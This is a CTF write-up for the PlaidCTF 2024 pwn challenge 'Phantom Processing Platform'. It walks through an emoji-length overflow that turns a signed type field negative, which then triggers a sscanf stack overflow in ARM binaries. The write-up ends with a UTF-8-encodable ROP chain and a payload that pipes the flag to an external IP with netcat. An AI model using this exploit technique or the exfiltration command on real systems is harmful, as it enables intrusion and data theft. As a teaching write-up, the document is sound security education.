# Phantom Processing Platform


![https://plaidctf.com](https://img.shields.io/badge/Event-PlaidCTF%202024-red)
![](https://img.shields.io/badge/Category-pwn-red)
![](https://img.shields.io/badge/Author-kylar-brightgreen)
![](https://img.shields.io/badge/Testers-babaisflag-blueviolet)
![](https://img.shields.io/badge/Flag-375%20points%2C%206%20solves-orange)

<img src="https://raw.githubusercontent.com/ybieri/phantom_processing_platform/master/phantom.png" width=50%">

## Flavor Text

> Type. Spectral Analysis
>
> The Phantom Processing Platform stands as a beacon for the fearless, a digital haven where ghost sightings are not just reported but embraced and analyzed. Courageous souls gather here, their findings unveiling the mysteries that whisper from the shadows. It's a testament to human curiosity, daring to unveil what lurks in the unseen.
>
> Hypotheses. Phantoms! Run or observe?

## About
The problem provides the phantom processing platform, which is a platform to report ghosts sightings. It consists of a sensor and processor component. Both binaries are compiled as ARM 32-bit and are running in a custom buildroot environment. 

The sensor offers the user the following commands:

```c
1. Add Ghost Data
2. Show Ghost Data
3. Edit Ghost Data
4. Delete Ghost Data
5. Analyze Ghost Data
6. Switch Mode
7. Exit
```

The user can thus add, show, edit, and delete ghost sightings. Additionally, an analysis of all entered ghosts can be performed and an option to switch between modern mode (emojies) and legacy mode (text) is provided.

The goal is to get code execution on the processor to read the flag.

## Overview
To analyze the binaries, the provided `rootfs.cpio` can be extracted using:
```bash
mkdir ./cpio_contents
pushd ./cpio_contents > /dev/null
cat ../rootfs.cpio | cpio -idmv
popd > /dev/null
```
Afterwards, it's worth analyzing how the binaries are run. The file `S99start` was added to run on boot:
```bash
#!/bin/sh

start() {
    echo 2 > /proc/sys/kernel/randomize_va_space
    echo 10 > /proc/sys/vm/mmap_rnd_bits
    chmod 0444 /flag
    passwd -l root
    
    mkdir -p /tmp/sockets
    chmod 0333  /tmp/sockets

    [ -x /start.sh ] || chmod +x /start.sh

    su -s /bin/sh -c 'cd / && exec /start.sh &' ctf
}

[...CUT...]
```
It's noteworthy that it enables ASLR and sets the randomness to 10 bits. Afterwards it runs the start.sh script: 

```bash
#!/bin/bash

SENSOR_PORT=1337

socat TCP-LISTEN:${SENSOR_PORT},reuseaddr,fork EXEC:"setsid ./handle_connection.sh"
```

This script uses socat to run the `handle_connection.sh` script:

```bash
#!/bin/bash

socket_path=$(mktemp /tmp/sockets/socket_XXXXXX)

cleanup() {
    sleep 1
    kill -TERM -$$  2>/dev/null
    rm -f "$socket_path"  
}

enforce_timeout() {
    local timeout_seconds=20
    sleep $timeout_seconds
    cleanup
    kill -TERM -$$  
}

trap cleanup EXIT
enforce_timeout &
/processor_arm "$socket_path" > /dev/null 2>&1 &
sleep 0.1  
/sensor_arm "$socket_path"
```
This script finally just starts the processor and sensor for the user to interact with.


Running `checksec` on the processor and sensor binaries shows that both are compiled for arm-32-little endian and are compiled without stack canaries. This already hints at a buffer overflow. The other protections are enabled. 
```bash
$ checksec processor_arm sensor_arm
[*] 'processor_arm'
    Arch:     arm-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 'sensor_arm'
    Arch:     arm-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Bugs
When operating on ghost sightings, the data is transmitted in the following struct:
```c
typedef struct {
    uint32_t timestamp;                 
    float latitude;                     
    float longitude;                    
    char title[TITLE_LEN];              
    int8_t type;                         
    int8_t confidence;                   
    uint16_t id;                         
    char description[DESCRIPTION_SIZE];  
} GhostPacket;
```

The `type` can be one of the following:
```c
typedef enum {
    ETHEREAL_VOYAGER = 0x00,  
    WHISPERING_SHADE = 0x01,  
    POLTERGEIST = 0x02,       
    WRAITH = 0x03,            
    SHADOW_FIGURE = 0x04,     
    REVENANT = 0x05,          
    SPECTRE = 0x06,           
    DOPPELGANGER = 0x07,      
    CUSTOM_GHOST = 0x08,      
} GhostType;
```

When selecting the types 0-7, a "default ghost" is added with a randomly selected title and description. If the value 8 is chosen, the title and description can be chonsen freely.

### Bug 1
When a ghost is added, a symbol or emoji is added to the title, depending on how condifent the reporter is. To account for this, the sensor subtracts the length of the emoji from the title field:
```c
printf("Enter title of your ghost observation report: \n");
    if (readInput(packet->title, TITLE_LEN-strlen(EMOJI_99)) <= 0) {
        printf("Failed to read title.\n");
        return -1;
    }
```

Afterward, the processor appends the emoji:
```c
#define EMOJI_99 "😁👻"
#define EMOJI_75 "🤔👻"
#define EMOJI_50 "😐👻"
#define EMOJI_5 "😕👻"
#define EMOJI_0 "☹️👻"

[...CUT...]

void appendEmoji(GhostPacket* packet) {
    if (is_modern) {
        if (packet->confidence > 95) {
            strcat(packet->title, EMOJI_99);
        } else if (packet->confidence > 65) {
            strcat(packet->title, EMOJI_75);
        } else if (packet->confidence > 35) {
            strcat(packet->title, EMOJI_50);
        } else if (packet->confidence > 5) {
            strcat(packet->title, EMOJI_5);
        } else {
            strcat(packet->title, EMOJI_0);
        }
    } else {
        if (packet->confidence > 95) {
            strcat(packet->title, " ++");
        } else if (packet->confidence > 65) {
            strcat(packet->title, "  +");
        } else if (packet->confidence > 35) {
            strcat(packet->title, "  ~");
        } else if (packet->confidence > 5) {
            strcat(packet->title, "  -");
        } else {
            strcat(packet->title, " --");
        }
    }
}
```
The issue is, that `EMOJI_0` is 11 characters long while all other emojies are only 9 characters long. Thus, when operating in "modern mode" with confidence lower than 5, the `title` field will overflow 2 bytes into the `type` fields.
`EMOJI_0` translates to `E2 98 B9 EF B8 8F F0 9F 91 BB` or `-30 -104 -71 -17 -72 -113 -16 -97 -111 -69`. Thus, when overflowing, the type of the ghost will be set to `-69`.

### Bug 2
This brings us to the second bug. When a default ghost is created in the sensor, it will be assigned a description and a random trait, separated by a `~` character. The processor then uses `sscanf` to parse the description and trait into two buffers, each half as large as the whole description. While this will never be an issue for a "default ghost", if an attacker can control the description, they will be able to create a buffer overflow.

```c
void extractAndMatchTraits(const GhostPacket* packet, int traitOccurrences[NUM_DEFAULT_GHOSTS][TRAITS_PER_GHOST]) {
    char descriptionBeforeTrait[DESCRIPTION_SIZE / 2] = {0};
    char extractedTrait[DESCRIPTION_SIZE / 2] = {0};
    
    if (packet->type < CUSTOM_GHOST) {
        if (sscanf(packet->description, "%[^~] ~ %[^\n]", descriptionBeforeTrait, extractedTrait) == 2) {
            for (int h = 0; h < NUM_DEFAULT_GHOSTS; h++) {
                for (int j = 0; j < TRAITS_PER_GHOST; j++) {
                    if (strcmp(extractedTrait, ghostTraits[h][j]) == 0) {
                        traitOccurrences[h][j]++;
                        break;
                    }
                }
            }
        }
    }
}
```
Normally, only "default ghosts" will have a trait, and only their description will be passed to `sscanf`. But the check `if (packet->type < CUSTOM_GHOST)` does not account for negative `type` values. Thus, an attacker can use bug 1 to overflow `type` to be nagative (-69) and then add a long description. This will trigger and overflow when being parsed by `sscanf` into the two stack buffers.

## Exploitation
The exploitation seems quite simple now, but there is one more issue to overcome. The processor does validate every `GhostPacket` it receives:

```c
int validateGhostPacket(GhostPacket* newPacket) {
    if (newPacket->timestamp > time(NULL)) {
        return -1;
    }

    if (newPacket->latitude < -90.0 || newPacket->latitude > 90.0 ||
        newPacket->longitude < -180.0 || newPacket->longitude > 180.0) {
        return -1;
    }

    if (!isValidUtf8(newPacket->title)) {
        return -1;
    }

    if (newPacket->type > CUSTOM_GHOST) {
        return -1;
    }

    if (newPacket->confidence > 100) {
        return -1;
    }

    if (!isValidUtf8(newPacket->description)) {
        return -1;
    }

    return 0;
}
```
Important for us is the check on the description. The processor ensures that the description field only contains UTF-8 characters. This will make exploitation a lot more complex.

The processor is compiled with ASLR, but we recall from the `S99start` script, that only 10 bits of randomness are set. Therefore, no leak is required but a 1/1024 bruteforce can be used.

When trying to find gadgets that are UTF-8 encodable, it is imortant to understand how UTF-8 works. The 1-byte UTF-8 range is from `0x00-0x7f`. This will most likely not be enough to encode meaningful gadgets. But there is also 2, 3, and 4 byte UTF-8 characters. Those allow to encode 1 to 2 arbitrary bytes, while clobbering the next byte. Have a look at [UTF-8 Wikipedia](https://en.wikipedia.org/wiki/UTF-8) for a better explanation.

There is multiple ways to find gadgets now. My approach was to run ropper on `libc` to create extract all gadgets first. Afterwards, I wrote a small script [TODO Gadget helper]() that adds all 1024 ASLR offsets to the gadgets. For each offset it checks for each gadget if it is UTF-8 encodable. If so, it writes the gadgets to a new file. To reduce the number of files, I excluded ALSR offsets, where `system` was not UTF-8 encodable. 

I then came up with the following gadget chain at ALSR offset 32:
```python
SYSTEM  = 0x76abd258 #                                                            SYSTEM # 0x76eb0258 
JMP1    = 0x76afca50 #['0x76afca50', 'pop {r4, pc}; ldr r0, [r0, #0x64]; bx lr;']   JMP2 # 0x76ee0824
JMP2    = 0x76aed824 #['0x76aed824', 'add r0, sp, #0x10; blx r4;']                  JMP1 # 0x76ed3f0c
```

The `JMP2` gadget allows to move the stackpointer `sp` into `r0`. The `JMP1` gadget is used to move the `system` address into `r4`. In combination, this will allow us to call `system(<command on stack>)`.


The final paylod looks like this:
```python
payload  = b"A"*136 # buffer
payload += b"aaaa"  # r7
payload += p32(JMP1)
payload += p32(SYSTEM)
payload += p32(JMP2)
payload += b"B"*16
payload += b"cat /flag | nc 167.71.33.163 1"
```

Finally, I just had to run the exploit in a loop until my desired ASLR offset appeared. See [./exploit.py]() for the full exploit script.

Congrats to the 6 teams that solved the challenge!
